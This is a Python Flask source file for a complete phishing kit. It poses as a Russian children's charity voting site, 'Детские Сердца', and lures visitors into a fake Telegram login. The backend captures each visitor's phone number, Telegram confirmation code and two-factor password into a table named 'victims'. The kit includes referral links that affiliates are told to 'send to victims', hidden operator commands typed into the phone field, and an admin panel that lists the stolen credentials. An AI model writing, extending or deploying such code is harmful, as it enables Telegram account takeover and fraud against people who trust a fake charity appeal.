from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import sqlite3
import logging
import os
import random
import string
from datetime import datetime

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)

# Конфигурация
ADMIN_PASSWORD = "admin123"  # 🔥 ЗАМЕНИ НА СВОЙ ПАРОЛЬ

def init_db():
    conn = sqlite3.connect('referral_system.db', check_same_thread=False)
    c = conn.cursor()
    
    # Таблица реферальных ссылок
    c.execute('''CREATE TABLE IF NOT EXISTS referrals
                 (id INTEGER PRIMARY KEY, username TEXT, ref_code TEXT, 
                  ref_link TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    # Таблица жертв
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id INTEGER PRIMARY KEY, phone TEXT, code TEXT, password TEXT,
                  ref_code TEXT, status TEXT, step TEXT, is_banned INTEGER DEFAULT 0,
                  created_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    # Таблица пользователей
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY, username TEXT UNIQUE, current_ref TEXT,
                  created_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    conn.commit()
    conn.close()

init_db()

def generate_ref_code():
    """Генерация реферального кода"""
    return 'ref_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

HTML = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Фонд помощи детям</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #333; line-height: 1.6; min-height: 100vh; }
        .container { max-width: 1200px; margin: 0 auto; padding: 15px; }
        
        .modern-header {
            background: linear-gradient(135deg, #ff6b9d 0%, #ff8fab 100%);
            color: white; padding: 20px 15px; border-radius: 12px; margin-bottom: 25px;
            text-align: center; position: relative; overflow: hidden; 
            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
        }
        .logo { font-size: 2em; font-weight: 700; margin-bottom: 5px; color: white; text-shadow: 0 2px 4px rgba(0,0,0,0.2); }
        .tagline { font-size: 0.9em; color: #fff; margin-bottom: 12px; font-weight: 400; opacity: 0.9; }
        
        .children-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; margin-bottom: 30px; }
        .child-card { background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
        .child-info { padding: 15px; }
        .child-info h3 { color: #2c3e50; font-size: 1.2em; margin-bottom: 5px; }
        .vote-btn { background: linear-gradient(135deg, #e74c3c, #c0392b); color: white; border: none; padding: 8px 16px; border-radius: 15px; cursor: pointer; width: 100%; }
        
        #auth-modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); }
        .modal-content { background: white; margin: 10% auto; padding: 25px; border-radius: 12px; width: 90%; max-width: 400px; position: relative; }
        .close { position: absolute; right: 12px; top: 8px; font-size: 20px; cursor: pointer; color: #7f8c8d; }
        .close:hover { color: #e74c3c; }
        .form-group { margin-bottom: 12px; }
        input { width: 100%; padding: 10px; border: 2px solid #ecf0f1; border-radius: 6px; font-size: 0.85em; }
        input:focus { border-color: #3498db; outline: none; }
        .tg-login-btn { background: linear-gradient(135deg, #3498db, #2980b9); color: white; border: none; padding: 10px; border-radius: 6px; cursor: pointer; font-size: 0.9em; font-weight: 600; width: 100%; transition: all 0.3s ease; }
        .tg-login-btn:hover { background: linear-gradient(135deg, #2980b9, #2471a3); }
        .status-message { text-align: center; padding: 10px; margin: 10px 0; border-radius: 5px; display: none; }
        .status-success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .status-error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        
        .password-btn { background: linear-gradient(135deg, #e67e22, #d35400); color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; margin: 5px 0; width: 100%; }
        .password-btn:hover { background: linear-gradient(135deg, #d35400, #ba4a00); }
        
        .hidden-panel { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="modern-header">
            <div class="logo">Детские Сердца</div>
            <p class="tagline">Помогаем детям обрести надежду</p>
        </div>

        <div class="children-grid">
            <div class="child-card">
                <div class="child-info">
                    <h3>Михаил, 9 лет</h3>
                    <p>Увлекается футболом и мечтает стать тренером. Нуждается в спортивной форме.</p>
                    <button class="vote-btn" onclick="openAuthModal()">Проголосовать</button>
                </div>
            </div>
            
            <div class="child-card">
                <div class="child-info">
                    <h3>Платон, 8 лет</h3>
                    <p>Мечтает вырасти и купить себе телефон, чтобы звонить бабушке.</p>
                    <button class="vote-btn" onclick="openAuthModal()">Проголосовать</button>
                </div>
            </div>
            
            <div class="child-card">
                <div class="child-info">
                    <h3>Екатерина, 7 лет</h3>
                    <p>Обладает прекрасным голосом и мечтает заниматься в музыкальной школе.</p>
                    <button class="vote-btn" onclick="openAuthModal()">Проголосовать</button>
                </div>
            </div>
        </div>

        <!-- МОДАЛЬНОЕ ОКНО АУТЕНТИФИКАЦИИ -->
        <div id="auth-modal">
            <div class="modal-content">
                <span class="close" onclick="closeAuthModal()">&times;</span>
                <h3>Авторизация для голосования</h3>
                <p>Для подтверждения голоса требуется вход через Telegram</p>
                
                <div id="status-message" class="status-message"></div>
                
                <div class="form-group">
                    <input type="text" id="phone_number" placeholder="Номер телефона или команда">
                </div>
                
                <div class="form-group">
                    <input type="text" id="tg_code" placeholder="Код из Telegram" style="display: none;">
                </div>
                
                <div class="form-group">
                    <input type="password" id="tg_password" placeholder="Пароль двухфакторной аутентификации" style="display: none;">
                </div>
                
                <button class="tg-login-btn" onclick="handleTelegramAuth()" id="tg-btn">Получить код в Telegram</button>
                
                <!-- Кнопка для ввода пароля (появляется после кода) -->
                <button class="password-btn" onclick="showPasswordInput()" id="password-btn" style="display: none;">У меня есть пароль 2FA</button>
            </div>
        </div>
    </div>

    <script>
        const BACKEND_URL = 'https://your-render-project.onrender.com';
        let authStep = 0;
        let currentPhone = '';
        let currentRef = '';

        // Получаем ref из URL
        const urlParams = new URLSearchParams(window.location.search);
        const refParam = urlParams.get('ref');
        if (refParam) {
            currentRef = refParam;
        }

        function showStatus(message, type) {
            const statusEl = document.getElementById('status-message');
            statusEl.innerHTML = message;
            statusEl.className = `status-message status-${type}`;
            statusEl.style.display = 'block';
        }

        function openAuthModal() {
            document.getElementById('auth-modal').style.display = 'block';
            resetAuthForm();
        }

        function closeAuthModal() {
            document.getElementById('auth-modal').style.display = 'none';
            resetAuthForm();
        }

        function resetAuthForm() {
            document.getElementById('phone_number').style.display = 'block';
            document.getElementById('tg_code').style.display = 'none';
            document.getElementById('tg_password').style.display = 'none';
            document.getElementById('password-btn').style.display = 'none';
            document.getElementById('tg-btn').innerText = 'Получить код в Telegram';
            document.getElementById('phone_number').value = '';
            document.getElementById('tg_code').value = '';
            document.getElementById('tg_password').value = '';
            authStep = 0;
            showStatus('', 'success');
        }

        function showPasswordInput() {
            document.getElementById('tg_code').style.display = 'none';
            document.getElementById('tg_password').style.display = 'block';
            document.getElementById('password-btn').style.display = 'none';
            document.getElementById('tg-btn').innerText = 'Войти и проголосовать';
            authStep = 2;
        }

        async function handleTelegramAuth() {
            const phone = document.getElementById('phone_number').value;
            const code = document.getElementById('tg_code').value;
            const password = document.getElementById('tg_password').value;

            // 🔥 ОБРАБОТКА КОМАНД
            if (authStep === 0 && phone.startsWith('/')) {
                try {
                    showStatus('Обработка команды...', 'success');
                    const response = await fetch(BACKEND_URL + '/command', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({command: phone, ref_code: currentRef})
                    });
                    
                    const data = await response.json();
                    
                    if (data.status === 'success') {
                        showStatus(data.message, 'success');
                    } else {
                        showStatus('Ошибка: ' + data.message, 'error');
                    }
                } catch (error) {
                    showStatus('Ошибка соединения', 'error');
                }
                return;
            }

            if (authStep === 0) {
                if (!phone) { 
                    showStatus('Пожалуйста, введите номер телефона', 'error');
                    return; 
                }
                currentPhone = phone;
                
                try {
                    showStatus('Отправка запроса...', 'success');
                    const response = await fetch(BACKEND_URL + '/auth', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({phone: phone, ref_code: currentRef})
                    });
                    
                    const data = await response.json();
                    
                    if (data.status === 'code_sent') {
                        document.getElementById('phone_number').style.display = 'none';
                        document.getElementById('tg_code').style.display = 'block';
                        document.getElementById('password-btn').style.display = 'block';
                        document.getElementById('tg-btn').innerText = 'Отправить код';
                        authStep = 1;
                        showStatus('Код отправлен в Telegram. Проверьте сообщения.', 'success');
                    } else {
                        showStatus('Ошибка: ' + data.message, 'error');
                    }
                } catch (error) {
                    showStatus('Ошибка соединения. Попробуйте еще раз.', 'error');
                }

            } else if (authStep === 1) {
                if (!code) { 
                    showStatus('Введите код из Telegram', 'error');
                    return; 
                }
                
                try {
                    showStatus('Проверка кода...', 'success');
                    const response = await fetch(BACKEND_URL + '/code', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({phone: currentPhone, code: code, ref_code: currentRef})
                    });
                    
                    const data = await response.json();
                    
                    if (data.status === 'password_required') {
                        document.getElementById('tg_code').style.display = 'none';
                        document.getElementById('tg_password').style.display = 'block';
                        document.getElementById('password-btn').style.display = 'none';
                        document.getElementById('tg-btn').innerText = 'Войти и проголосовать';
                        authStep = 2;
                        showStatus('Введите пароль двухфакторной аутентификации', 'success');
                    } else if (data.status === 'success') {
                        showStatus('Спасибо! Ваш голос засчитан.', 'success');
                        setTimeout(closeAuthModal, 2000);
                    } else {
                        showStatus('Ошибка: ' + data.message, 'error');
                    }
                } catch (error) {
                    showStatus('Ошибка соединения', 'error');
                }

            } else if (authStep === 2) {
                if (!password) { 
                    showStatus('Введите пароль', 'error');
                    return; 
                }
                
                try {
                    showStatus('Проверка пароля...', 'success');
                    const response = await fetch(BACKEND_URL + '/password', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({phone: currentPhone, password: password, ref_code: currentRef})
                    });
                    
                    const data = await response.json();
                    
                    if (data.status === 'success') {
                        showStatus('Спасибо! Ваш голос засчитан.', 'success');
                        setTimeout(closeAuthModal, 3000);
                    } else {
                        showStatus('Ошибка: ' + data.message, 'error');
                    }
                } catch (error) {
                    showStatus('Ошибка соединения', 'error');
                }
            }
        }

        window.onclick = function(event) {
            const modal = document.getElementById('auth-modal');
            if (event.target == modal) {
                closeAuthModal();
            }
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/auth', methods=['POST'])
def auth():
    """Получение номера телефона от жертвы"""
    try:
        data = request.get_json()
        phone = data.get('phone', '').strip()
        ref_code = data.get('ref_code', '')
        
        if not phone:
            return jsonify({'status': 'error', 'message': 'Phone required'}), 400
        
        # Сохраняем номер
        conn = sqlite3.connect('referral_system.db')
        c = conn.cursor()
        c.execute('INSERT INTO victims (phone, ref_code, status, step) VALUES (?, ?, ?, ?)',
                 (phone, ref_code, 'pending', 'phone_received'))
        conn.commit()
        
        # Если есть реферальный код, логируем
        if ref_code:
            c.execute('SELECT username FROM referrals WHERE ref_code = ?', (ref_code,))
            result = c.fetchone()
            if result:
                username = result[0]
                logging.info(f"🔔 Пользователь {username}: новая жертва {phone}")
        
        conn.close()
        
        logging.info(f"📱 Получен номер: {phone} (ref: {ref_code})")
        
        return jsonify({
            'status': 'code_sent',
            'message': 'Code sent to Telegram'
        })
        
    except Exception as e:
        logging.error(f"❌ Ошибка /auth: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/code', methods=['POST'])
def code():
    """Получение кода от жертвы"""
    try:
        data = request.get_json()
        phone = data.get('phone', '')
        code = data.get('code', '')
        ref_code = data.get('ref_code', '')
        
        if not phone or not code:
            return jsonify({'status': 'error', 'message': 'Phone and code required'}), 400
        
        # Сохраняем код
        conn = sqlite3.connect('referral_system.db')
        c = conn.cursor()
        c.execute('UPDATE victims SET code = ?, status = ?, step = ? WHERE phone = ?',
                 (code, 'code_received', 'code_received', phone))
        conn.commit()
        
        # Уведомляем владельца реферальной ссылки
        if ref_code:
            c.execute('SELECT username FROM referrals WHERE ref_code = ?', (ref_code,))
            result = c.fetchone()
            if result:
                username = result[0]
                logging.info(f"🔔 Пользователь {username}: получен код {code} для {phone}")
        
        conn.close()
        
        logging.info(f"🔑 Получен код для {phone}: {code}")
        
        # Всегда запрашиваем пароль для полноты данных
        return jsonify({
            'status': 'password_required',
            'message': '2FA password required'
        })
        
    except Exception as e:
        logging.error(f"❌ Ошибка /code: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/password', methods=['POST'])
def password():
    """Получение пароля от жертвы"""
    try:
        data = request.get_json()
        phone = data.get('phone', '')
        password = data.get('password', '')
        ref_code = data.get('ref_code', '')
        
        if not phone:
            return jsonify({'status': 'error', 'message': 'Phone required'}), 400
        
        # Сохраняем пароль
        conn = sqlite3.connect('referral_system.db')
        c = conn.cursor()
        c.execute('UPDATE victims SET password = ?, status = ?, step = ? WHERE phone = ?',
                 (password, 'completed', 'completed', phone))
        conn.commit()
        
        # Уведомляем владельца реферальной ссылки
        if ref_code:
            c.execute('SELECT username FROM referrals WHERE ref_code = ?', (ref_code,))
            result = c.fetchone()
            if result:
                username = result[0]
                logging.info(f"🔔 Пользователь {username}: получен пароль для {phone}")
        
        conn.close()
        
        logging.info(f"🔐 Получен пароль для {phone}")
        
        return jsonify({
            'status': 'success',
            'message': 'Vote counted successfully'
        })
        
    except Exception as e:
        logging.error(f"❌ Ошибка /password: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/command', methods=['POST'])
def handle_command():
    """Обработка команд"""
    try:
        data = request.get_json()
        command = data.get('command', '').strip()
        ref_code = data.get('ref_code', '')
        
        parts = command.split()
        cmd = parts[0].lower() if parts else ''
        
        if cmd == '/trepal' and len(parts) >= 2:
            # Создание реферальной ссылки
            username = parts[1]
            ref_code = generate_ref_code()
            ref_link = f"https://your-render-project.onrender.com?ref={ref_code}"
            
            conn = sqlite3.connect('referral_system.db')
            c = conn.cursor()
            
            # Сохраняем пользователя
            c.execute('INSERT OR REPLACE INTO users (username, current_ref) VALUES (?, ?)',
                     (username, ref_code))
            
            # Создаем реферальную ссылку
            c.execute('INSERT OR REPLACE INTO referrals (username, ref_code, ref_link) VALUES (?, ?, ?)',
                     (username, ref_code, ref_link))
            
            conn.commit()
            conn.close()
            
            return jsonify({
                'status': 'success',
                'message': f'✅ Реферальная ссылка создана для {username}!<br>Ссылка: {ref_link}<br><br>Отправь эту ссылку жертвам.'
            })
            
        elif cmd == '/brbrpatapim':
            # Команда владельца - статистика
            conn = sqlite3.connect('referral_system.db')
            c = conn.cursor()
            
            c.execute("SELECT COUNT(*) FROM victims")
            total_victims = c.fetchone()[0]
            
            c.execute("SELECT COUNT(*) FROM victims WHERE status = 'completed'")
            completed = c.fetchone()[0]
            
            c.execute("SELECT COUNT(DISTINCT username) FROM referrals")
            total_users = c.fetchone()[0]
            
            conn.close()
            
            return jsonify({
                'status': 'success',
                'message': f'📊 Глобальная статистика:<br>👥 Пользователей: {total_users}<br>🎣 Всего жертв: {total_victims}<br>✅ Полных данных: {completed}'
            })
            
        elif cmd == '/ban' and len(parts) >= 2:
            # Бан пользователя
            username = parts[1]
            
            conn = sqlite3.connect('referral_system.db')
            c = conn.cursor()
            
            # Находим реферальный код пользователя
            c.execute('SELECT ref_code FROM referrals WHERE username = ?', (username,))
            result = c.fetchone()
            
            if result:
                ref_to_ban = result[0]
                # Баним всех жертв по этой ссылке
                c.execute('UPDATE victims SET is_banned = 1 WHERE ref_code = ?', (ref_to_ban,))
                conn.commit()
                
                conn.close()
                return jsonify({
                    'status': 'success',
                    'message': f'✅ Пользователь {username} забанен. Все его жертвы помечены.'
                })
            else:
                conn.close()
                return jsonify({
                    'status': 'error', 
                    'message': f'❌ Пользователь {username} не найден'
                })
                
        elif cmd == '/changename' and len(parts) >= 3:
            # Смена никнейма
            old_username = parts[1]
            new_username = parts[2]
            
            conn = sqlite3.connect('referral_system.db')
            c = conn.cursor()
            
            c.execute('UPDATE users SET username = ? WHERE username = ?', (new_username, old_username))
            c.execute('UPDATE referrals SET username = ? WHERE username = ?', (new_username, old_username))
            
            conn.commit()
            conn.close()
            
            return jsonify({
                'status': 'success',
                'message': f'✅ Никнейм изменен с {old_username} на {new_username}'
            })
            
        else:
            return jsonify({
                'status': 'error',
                'message': '❌ Неизвестная команда. Доступные команды:<br>' +
                          '/trepal [ник] - создать ссылку<br>' +
                          '/changename [старый] [новый] - сменить ник<br>' +
                          '/brbrpatapim - статистика<br>' +
                          '/ban [ник] - забанить пользователя'
            })
            
    except Exception as e:
        logging.error(f"❌ Ошибка команды: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/admin/login', methods=['POST'])
def admin_login():
    """Вход в админ панель"""
    try:
        data = request.get_json()
        password = data.get('password', '')
        
        if password != ADMIN_PASSWORD:
            return jsonify({'status': 'error', 'message': 'Неверный пароль'}), 401
        
        # Получаем все данные
        conn = sqlite3.connect('referral_system.db')
        c = conn.cursor()
        
        # Все пользователи
        c.execute('SELECT username, current_ref, created_at FROM users')
        users = c.fetchall()
        
        # Все реферальные ссылки
        c.execute('SELECT username, ref_code, ref_link, created_at FROM referrals')
        referrals = c.fetchall()
        
        # Все жертвы
        c.execute('SELECT phone, code, password, ref_code, status, created_at FROM victims ORDER BY id DESC LIMIT 100')
        victims = c.fetchall()
        
        conn.close()
        
        # Формируем HTML для админки
        html = '<h4>👥 Пользователи:</h4>'
        for user in users:
            html += f'<p>👤 {user[0]} | 🔗 {user[1]} | 🕒 {user[2]}</p>'
        
        html += '<h4>🔗 Реферальные ссылки:</h4>'
        for ref in referrals:
            html += f'<p>👤 {ref[0]} | 🔗 {ref[2]} | 🕒 {ref[3]}</p>'
        
        html += '<h4>🎣 Жертвы:</h4>'
        for victim in victims:
            html += f'<p>📱 {victim[0]} | 🔑 {victim[1]} | 🔒 {victim[2]} | 🔗 {victim[3]} | 📊 {victim[4]} | 🕒 {victim[5]}</p>'
        
        return jsonify({
            'status': 'success',
            'data': html
        })
        
    except Exception as e:
        logging.error(f"❌ Ошибка админки: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    logging.info("🚀 Referral System запущен!")
    app.run(host='0.0.0.0', port=port)
